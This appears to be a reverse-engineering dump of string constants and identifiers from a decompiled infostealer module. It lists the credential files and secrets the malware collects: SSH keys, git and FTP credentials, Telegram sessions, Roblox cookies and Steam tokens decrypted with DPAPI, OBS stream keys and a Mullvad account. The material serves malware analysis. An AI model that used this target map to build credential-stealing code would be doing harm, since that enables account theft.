"""
SilentNet Infostealer - Decompiled Module
Module: .app.handlers.credentials
Chunk size: 5825 bytes
String constants: 129 unicode, 249 identifiers

# Non-browser credential file theft (20+ apps)
# Original path: app/handlers/credentials.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: trace
# identifier: scan
# identifier: _get_telegram_data
'Git_Credentials.txt'
# identifier: join
# identifier: _USER_HOME
'.git-credentials'
'SSH_Keys.zip'
'.ssh'
'FileZilla_RecentServers.xml'
# identifier: _APPDATA
# identifier: FileZilla
'recentservers.xml'
'FileZilla_SiteManager.xml'
'sitemanager.xml'
'WinSCP_Config.ini'
'WinSCP.ini'
'RiotGames_Settings.yaml'
# identifier: _LOCALAPPDATA
'Riot Games'
'Riot Client'
# identifier: Data
'RiotGamesPrivateSettings.yaml'
'Thunderbird_Profiles.zip'
# identifier: Thunderbird
# identifier: Profiles
'Claude_Credentials.json'
'.claude'
'.credentials.json'
# identifier: HitFile
# identifier: HitFileCategory
# identifier: LOGIN
# identifier: path
# identifier: ready_for_upload
# identifier: files
# identifier: cr1
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Collected '
# identifier: LogType
# identifier: DEBUG
'path='
# identifier: _get_roblox_cookies
# identifier: _get_obs_stream_keys
# identifier: _get_mullvad_account
# identifier: _get_steam_tokens
# identifier: append
# identifier: cr9
# identifier: INFO
'count='
'Collect all credential files.'
# identifier: re
# identifier: compile
'user_data[^/\\\\]*[/\\\\](media_cache|cache)($|[/\\\\])'
# identifier: IGNORECASE
'user_data[^/\\\\]*[/\\\\]media_cache($|[/\\\\])'
# identifier: BytesIO
# identifier: tdata
# identifier: zipfile
# identifier: ZipFile
# identifier: __enter__
# identifier: __exit__
# identifier: walk
# identifier: relpath
# identifier: tdata_path
# identifier: search
# identifier: rel_root
# identifier: root
# identifier: root_folder_name
# identifier: zf
# identifier: write
# identifier: file_count
# identifier: getvalue
'Telegram zip failed'
# identifier: ERROR
'Zip Telegram tdata with exclusions. Returns (data, file_count).'
'Telegram Desktop'
'cr.tg'
# identifier: zip
# identifier: _zip_telegram
# identifier: exclude_cache
# identifier: empty
'cr.tg'
'big.'
# identifier: MB
'Telegram too large, excluding cache'
'size='
# identifier: exclude_cache
# identifier: data
'ok.'
'f.'
'Telegram data zipped'
'files='
' size='
'Telegram_Data.zip'
# identifier: data
'Zip Telegram tdata folder, excluding media_cache (and cache if >100MB).'
# identifier: Roblox
# identifier: LocalStorage
'RobloxCookies.dat'
'cr.rbx'
# identifier: found
# identifier: json
# identifier: load
# identifier: cookies_json
# identifier: get
# identifier: CookiesData
'cr.rbx'
'no.data'
'Roblox no CookiesData'
# identifier: WARN
'Field missing'
# identifier: base64
# identifier: b64decode
# identifier: dpapi_decrypt
'cr.rbx'
'dec.fail'
'Roblox DPAPI decrypt failed'
'Empty result'
# identifier: decode
'utf-8'
# identifier: ignore
# identifier: errors
'# Netscape HTTP Cookie File'
'# Roblox Cookies'
# identifier: split
'; '
# identifier: strip
'1893456000'
'#HttpOnly_'
# identifier: output_lines
# identifier: domain
# identifier: empty
'cr.rbx'
'Roblox cookies extracted'
'Roblox extraction failed'
'Extract and decrypt Roblox cookies, output in Netscape format.'
'obs-studio'
# identifier: basic
# identifier: profiles
# identifier: obs_profiles_path
'service.json'
# identifier: replace
'_StreamKey.json'
'cr.obs'
'OBS stream key collected'
'profile='
'OBS extraction failed'
'Extract OBS stream keys from all profiles.'
# identifier: subprocess
# identifier: run
# identifier: _CREATE_NO_WINDOW
# identifier: mullvad
# identifier: account
# identifier: get
# identifier: capture_output
# identifier: timeout
# identifier: creationflags
# identifier: returncode
'cr.mvd'
'not.logged'
'Mullvad not logged in'
'exit='
# identifier: stdout
'Mullvad account:'
'cr.mvd'
'no.account'
'Mullvad unexpected output'
'cr.mvd'
# identifier: ok
'Mullvad account extracted'
'len='
'Mullvad_Account.txt'
# identifier: encode
'utf-8'
# identifier: TimeoutExpired
'cr.mvd'
# identifier: timeout
'Mullvad CLI timeout'
'Command timed out after 10s'
'cr.mvd'
'Mullvad extraction failed'
'Extract Mullvad VPN account info via CLI.'
# identifier: winreg
# identifier: HKEY_LOCAL_MACHINE
'SOFTWARE\\Wow6432Node\\Valve\\Steam'
'SOFTWARE\\Valve\\Steam'
# identifier: OpenKey
# identifier: QueryValueEx
# identifier: InstallPath
'ndError'
'C:\\Program Files (x86)\\Steam'
'Find Steam installation path from registry or default location.'
# identifier: vdf
'vdf module not available'
'Cannot parse Steam files'
# identifier: config
'loginusers.vdf'
# identifier: users
# identifier: items
# identifier: AccountName
# identifier: usernames
# identifier: lower
'Steam loginusers parse failed'
'Extract account names from loginusers.vdf.'
'Recursively search for hex-encoded encrypted blobs.'
# identifier: find_blobs
'_extract_steam_blobs.<locals>.find_blobs'
'Steam local.vdf parse failed'
'Extract encrypted token blobs from local.vdf.'
# identifier: values
# identifier: blobs
# identifier: fromhex
'0123456789abcdefABCDEF'
'<genexpr>'
'_extract_steam_blobs.<locals>.find_blobs.<locals>.<genexpr>'
# identifier: _get_steam_path
'cr.stm'
# identifier: found
# identifier: _get_steam_usernames
'cr.stm'
'no.users'
'No Steam users found'
'loginusers.vdf empty or missing'
# identifier: Steam
'local.vdf'
# identifier: _extract_steam_blobs
'cr.stm'
'no.blobs'
'No Steam blobs found'
# identifier: dpapi_decrypt_with_entropy
# identifier: blob
# identifier: ey
# identifier: tokens
'cr.stm'
'no.tokens'
'No Steam tokens decrypted'
'DPAPI decryption yielded no valid tokens'
'Steam Refresh Tokens'
'=================================================='
'Username: '
'Token:    '
'cr.stm'
'Steam tokens extracted'
'Steam_Tokens.txt'
'Steam extraction failed'
'Extract Steam refresh tokens using DPAPI decryption.'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: io
# identifier: os
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
'util.crypto'
# identifier: dpapi_decrypt
# identifier: dpapi_decrypt_with_entropy
# identifier: HitFile
# identifier: HitFileCategory
# identifier: credentials
# identifier: getenv
# identifier: APPDATA
# identifier: LOCALAPPDATA
# identifier: expanduser
# identifier: get_credential_files
# identifier: tdata_path
# identifier: exclude_cache
# identifier: return
'ple'
# identifier: return
# identifier: steam_path
# identifier: return
# identifier: local_vdf_path
# identifier: return
'app\\handlers\\credentials.py'
# identifier: .0
# identifier: find_blobs
'<module app.handlers.credentials>'
# identifier: local_vdf_path
# identifier: vdf
# identifier: blobs
# identifier: find_blobs
# identifier: output
# identifier: obs_profiles_path
# identifier: profile_name
# identifier: profile_path
# identifier: service_json
# identifier: safe_profile
# identifier: file_name
# identifier: hit_file
# identifier: cookies_data_b64
# identifier: base64
# identifier: encrypted_bytes
# identifier: decrypted_bytes
# identifier: raw_cookies
# identifier: output_lines
# identifier: cookie_parts
# identifier: cookie
# identifier: parts
# identifier: domain
# identifier: host_only
# identifier: path
# identifier: secure
# identifier: expiry
# identifier: name
# identifier: value
# identifier: cookie_count
# identifier: output_data
# identifier: hkey
# identifier: subkey
# identifier: key
# identifier: path
# identifier: steam_path
# identifier: usernames
# identifier: local_vdf_path
# identifier: blobs
# identifier: tokens
# identifier: blob
# identifier: username
# identifier: entropy
# identifier: decrypted
# identifier: token
# identifier: output_lines
# identifier: output_data
# identifier: vdf
# identifier: loginusers_path
# identifier: usernames
# identifier: users_dict
# identifier: steam_id
# identifier: user_data
# identifier: account_name
# identifier: max_size
# identifier: data
# identifier: file_count
# identifier: size_mb
# identifier: exclude_cache
# identifier: exclude_pattern
# identifier: buffer
# identifier: root_folder_name
# identifier: file_count
# identifier: zf
# identifier: root
# identifier: dirs
# identifier: files_list
# identifier: rel_root
# identifier: file
# identifier: file_path
# identifier: rel_path
# identifier: arcname
# identifier: value
# identifier: find_blobs
# identifier: blobs
# identifier: files
# identifier: telegram_file
# identifier: credential_paths
# identifier: name
# identifier: path
# identifier: hit_file
# identifier: roblox_file
# identifier: obs_files
# identifier: steam_file
# identifier: __spec__
